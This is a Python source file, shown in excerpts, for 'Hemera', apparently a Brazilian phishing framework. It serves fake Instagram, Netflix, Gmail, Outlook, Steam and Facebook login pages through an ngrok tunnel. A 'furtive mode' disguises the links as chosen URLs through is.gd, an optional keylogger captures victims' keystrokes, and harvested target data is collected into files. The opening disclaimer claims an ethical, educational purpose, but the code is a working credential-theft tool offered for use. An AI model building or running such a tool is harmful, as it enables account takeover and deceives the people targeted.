...
┌══════════════════════════════════════════════════════════════┐
█                                                              █
█      - [+] Criador : ''' + A + "Diego" + G + ''' .:. Versão : ''' + A + "4.2" + G + ''' .:. [+] -        █
█                                                              █
└══════════════════════════════════════════════════════════════┘ ''')
   print ('''
     [+]═══════════[ Grupo : © Kerberos Sec ]═══════════[+]''')
...
def menu_program(): #Menu do Programa
  ...
  if (verificar_termos == True):
    print ("\n" + G + '''
    Ao utilizar esse programa ou Software,
    voçe concorda com todos os termos de uso descritos no arquivo LICENSE,
    lembrando que eu não me responsabilizo pelo uso desse programa
    por terceiros para cometer crimes digitais.
    O objetivo desse Software é estudar e compreender como funciona a vulnerabilidade humana
    para usar os conhecimentos para fins éticos.

    Não distribua sem dar os créditos.
    Não me responsabilizo por atos indevidos e criminosos de terceiros usando esse código!''')
   ...
   if (verificar_log == True):
    ...
    try:
     ...
     if (escolha_opcao == 2):
      ...
      banner_program()
      print ("\n" + A + W + "[" + A + G + "+" + W + "]" + A + C + " Digite " + A + G + "help" + C + " ou " + A + G + "?" + C + " para obter ajuda")
      ...
      while (True):
        ...
        dados = str(input("\n" + A + W + "[" + A + G + horario + W + "] " + DST + "Hemera" + W + " > " + A + G))
        prompt = dados.split() #Converter as strings digitadas acima em uma lista
        ...
        if (not prompt): #Se nada foi digitado, continue a execução
         ...
         try: #Se o usuário digitar show ou show options na posição 0 ou 1 da lista, será exibida a tela de configuração
           ...
           if (template_phishing == "Sem Template ativo" and url_action == "Sem URL de Destino ativa"):
             print ("\n\t" + G + " [+]════════════[ OPÇÕES ]════════════[+]")
             table = [[C + "          Template:    " + G, "%s ●" %template_phishing], [C + "          Porta:    " + G, "%i ✔" %porta], [C + "          URL de Ação:    " + G, "%s ●" %url_action], [C + "          Encurtar URL:    " + G, "%s ✔" %encurtar_url], [C + "          URL Furtiva: " + G, "%s ✔" %furtive], [C + "          Keylogger:    " + G, "%s ✔" %keylogger]]
        ...
        elif (prompt[0] == "set" and prompt[1] == "furtive" and prompt[2] == "mode" or prompt[0] == "SET" and prompt[1] == "FURTIVE" and prompt[2] == "MODE"):
          try:
            furtive = str(prompt[3])

            if (furtive == "on" or furtive == "ON" or furtive == "off" or furtive == "OFF"):
              continue
          ...
          banner_program()
          print ("\n" + A + G + "[+]═══════════════════════════[ AJUDA/HELP ]══════════════════════════════════[+]")
          print ("\n" + A + C + "Comando:" + A + G + " show options " + C + "=> " + A + W + "exibir configuração de Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " show templates " + C + "=> " + A + W + "exibir templates disponiveis")
          print ("\n" + A + C + "Comando:" + A + G + " show history " + C + "=> " + A + W + "exibir dados coletados do alvo anterior")
          print ("\n" + A + C + "Comando:" + A + G + " set template (instagram,netflix,gmail) " + C + "=> " + A + W + "setar um Template")
          print ("\n" + A + C + "Comando:" + A + G + " set porta (8080,3333) " + C + "=> " + A + W + "setar uma Porta")
          print ("\n" + A + C + "Comando:" + A + G + " set action url (link destino após o alvo cair no Phishing) " + C + "=> " + A + W + "setar uma URL de Destino")
          print ("\n" + A + C + "Comando:" + A + G + " set shortened url mode (on,off) " + C + "=> " + A + W + "ativar ou desativar modo encurtar url do Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " set keylogger mode (on,off) " + C + "=> " + A + W + "ativar ou desativar modo Keylogger (captura de teclas do alvo)")
          print ("\n" + A + C + "Comando:" + A + G + " set furtive mode (on,off) " + C + "=> " + A + W + "ativar ou desativar modo modificar URL do Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " help " + C + "=> " + A + W + "obter ajuda")
          print ("\n" + A + C + "Comando:" + A + G + " banner " + C + "=> " + A + W + "Altera o Banner do Hemera")
          print ("\n" + A + C + "Comando:" + A + G + " exploit " + C + "=> " + A + W + "Executar o Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " sair " + C + "=> " + A + W + "sair do Programa")
          print ("\n" + A + G + "[+]═══════════════════════════════════════════════════════════════════════════[+]")
          continue

        elif (prompt[0] == "set" and prompt[1] == "template" or prompt[0] == "SET" and prompt[1] == "TEMPLATE"):
          try:
        ...
        elif (prompt[0] == "set" and prompt[1] == "shortened" and prompt[2] == "url" and prompt[3] == "mode"):
          try:
            encurtar_url = str(prompt[4])
          ...
          try:
            ...
            if (verificar_action == True):
              ...
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " A URL de Destino %s é inválida. Use https! ex: https://www.url.com" %url_action)
              url_action = "Sem URL de Destino ativa"
              time.sleep(4.5)
              banner_program()
              continue
            ...
            if (verificar_action_url == True):
              ...
              if (template_phishing == "Sem Template ativo"):
                print ("\n" + W + "[" + R + "-" + W + "]" + C + " Defina um " + R + "Template " + C + "para o Phishing!")
                time.sleep(2.5)
                banner_program()
                continue
                ...
                if (encurtar_url == "on" and keylogger == "on" and furtive == "on" or encurtar_url == "ON" and keylogger == "ON" and furtive == "ON"):
                ...
                elif (encurtar_url == "off" and keylogger == "off" and furtive == "off" or encurtar_url == "OFF" and keylogger == "OFF" and furtive == "OFF"):
                  os.system("touch config_log.txt")
                  arquivo = open("config_log.txt","w")
                  arquivo.write(template_phishing + "\n")
                  arquivo.write(str(porta))
                  ...
                  print ("\n" + W + "[" + R + "-" + W + "]" + C + " As opções " + R + "shortened url " + C + ", " + R + "keylogger mode " + C + "e " + R + "furtive mode " + C + "não podem ser diferentes!")
                  time.sleep(2.5)
                  banner_program()
                  continue

            else:
              print ("\n" + W + "[" + R + "-" + W + "]" + C + " Defina uma " + R + "URL de ação" + C + " para o Phishing!")
              time.sleep(2.5)
              banner_program()
              continue

        elif (prompt[0] == "sair" or prompt[0] == "SAIR" or prompt[0] == "quit" or prompt[0] == "exit" or prompt[0] == "EXIT"):
          stop()
          break
...
def phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger,furtive,horario):
...
exit();''' %url_action)
       ...
       print ("\n" + W + "[" + G + "+" + W + "]" + C + " URL do Phishing Ngrok: " + G)
       os.system("curl -s localhost:4040/api/tunnels | jq -r .tunnels[0].public_url")
       if (encurtar_url == "on" and keylogger == "on" and furtive == "on" or encurtar_url == "ON" and keylogger == "ON" and furtive == "ON"):
           print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite a URL desejada que será usada no Phishing")
           url_mod = str(input("\n" + A + W + "[" + A + G + horario + W + "] " + DST + "Hemera" + W + " > " + A + G))
           server2 = requests.post("https://is.gd/create.php?format=json&callback=myfunction&url=%s&shorturl=%s" %(ler_url_ngrok,url_mod))
           verificar_url_modificada = "https:" in server2.text
           if (verificar_url_modificada == True):
             url_modificada_isgd = server2.text[26:-1]
             url_modificada_isgd_link = url_modificada_isgd.replace("})", "")
             url_modificada_isgd_link_user = url_modificada_isgd_link.replace('"', '')
             print ("\n" + G + "[" + W + "+" + G + "]" + C + " URL Modificada: " + G + "%s" %url_modificada_isgd_link_user)
             ...
             if (server.status_code == 200): #Se o Encurtamento for bem sucedido, retornará o resultado ao usuário
              ...
              print ("\n" + R + "[" + W + "-" + R + "]" + W + " Não foi possível Modificar a URL com %s. Tente novamente." %url_mod)
              time.sleep(2.5)
              phishing_attack(template_phishing,porta,url_action,encurtar_url,keylogger,furtive,horario)

       else: #Se não possuir modos complementares
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/instagram/ip.txt")
...
?>''' %url_action)
       ...
       else: #Se não possuir dados complementares
             print ("\n" + W + "[" + G + "+" + W + "]" + C + " Esperando Alvo acessar o Phishing...")
             while (True):
               hora_atual = time.strftime("%H:%M:%S")
               verificar_network = os.path.exists("templates/gmail/ip.txt")
...
def menu_log():
   ...
   furtive = str(definir_log[5])
   arquivo_log.close()

   print ("\n" + W + "[" + A + G + "+" + W + "]" + C + " Digite " + A + G + "help" + C + " ou " + A + G + "?" + C + " para obter ajuda")

   while (True):
        horario = time.strftime("%H:%M:%S")
        dados = str(input("\n" + W + "[" + A + G + horario + W + "] " + DST + "Hemera" + W + " > " + A + G))
        prompt = dados.split()
        if (not prompt):
          continue
         ...
         try:
          ...
          banner_program()
          print ("\n" + A + G + "[+]═══════════════════════════[ AJUDA/HELP ]══════════════════════════════════[+]")
          print ("\n" + A + C + "Comando:" + A + G + " show options " + C + "=> " + A + W + "exibir configurações")
          print ("\n" + A + C + "Comando:" + A + G + " show templates " + C + "=> " + A + W + "exibir templates disponiveis")
          print ("\n" + A + C + "Comando:" + A + G + " show history " + C + "=> " + A + W + "exibir dados coletados do alvo anterior")
          print ("\n" + A + C + "Comando:" + A + G + " set template (instagram,facebook,gmail) " + C + "=> " + A + W + "setar um Template")
          print ("\n" + A + C + "Comando:" + A + G + " set porta (80,8080) " + C + "=> " + A + W + "setar uma Porta")
          print ("\n" + A + C + "Comando:" + A + G + " set action url (link destino após o alvo cair no Phishing) " + C + "=> " + A + W + "setar uma URL de Destino")
          print ("\n" + A + C + "Comando:" + A + G + " set shortened url mode (on,off) " + C + "=> " + A + W + "ativar ou desativar modo encurtar url do Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " set keylogger mode (on,off) " + C + "=> " + A + W + "ativar ou desativar modo Keylogger (captura de teclas do alvo)")
          print ("\n" + A + C + "Comando:" + A + G + " set furtive mode (on,off) " + C + "=> " + A + W + "ativar ou desativar modo modificar URL do Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " help " + C + "=> " + A + W + "obter ajuda")
          print ("\n" + A + C + "Comando:" + A + G + " banner " + C + "=> " + A + W + "Altera o Banner do Hemera")
          print ("\n" + A + C + "Comando:" + A + G + " exploit " + C + "=> " + A + W + "Executa o Phishing")
          print ("\n" + A + C + "Comando:" + A + G + " sair " + C + "=> " + A + W + "sair do Programa")
          print ("\n" + A + G + "[+]═══════════════════════════════════════════════════════════════════════════[+]")
        ...
        elif (prompt[0] == "set" and prompt[1] == "furtive" and prompt[2] == "mode"):
          try:
            furtive = str(prompt[3])
...
def interface_grafica():
   ...
   if (option == "1" or option == "01" or option == "instagram" or option == "Instagram" or option == "INSTAGRAM"): #Instagram
     template_phishing = "instagram"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)

   elif (option == "2" or option == "02" or option == "netflix" or option == "Netflix" or option == "NETFLIX"): #Netflix
     template_phishing = "netflix"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)

   elif (option == "3" or option == "03" or option == "gmail" or option == "Gmail" or option == "GMAIL"): #Gmail
     template_phishing = "gmail"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)

   elif (option == "4" or option == "04" or option == "outlook" or option == "Outlook" or option == "OUTLOOK"): #Outlook
     template_phishing = "outlook"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)

   elif (option == "5" or option == "05" or option == "steam" or option == "Steam" or option == "STEAM"): #Steam
     template_phishing = "steam"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)

   elif (option == "6" or option == "06" or option == "facebook" or option == "Facebook" or option == "FACEBOOK"): #Facebook
     template_phishing = "facebook"
     porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)

   else:
     print ("\n" + W + "[" + R + "-" + W + "]" + C + " A opção %s é inválida" %option)
     time.sleep(2.5)
     banner_program()
     interface_grafica()

def porta_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive):
   banner_program()
   ...
   try:
     ...
     if (porta == "80" or porta == "22" or porta == "443" or porta == "3128"):
       ...
       porta = int(porta)
       url_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive)
...
def url_program(template_phishing,porta,url_action,encurtar_url,keylogger,furtive):
   horario = time.strftime("%H:%M:%S")
   banner_program()
   print ("\n" + W + "[" + G + "+" + W + "]" + C + " Digite " + G + "?" + C + " ou " + G + "help" + C + " para obter ajuda")
   ...
   if (verificar_url == True):
     banner_program()
     escolha2 = str(input("\n" + W + "[" + A + G + "+" + W + "]" + C + " Deseja usar modo Encurtar URL, Keylogger e Furtive? : " + A + G))
...
try:
   os.popen("resize -s 36 95 > /dev/null 2>&1")
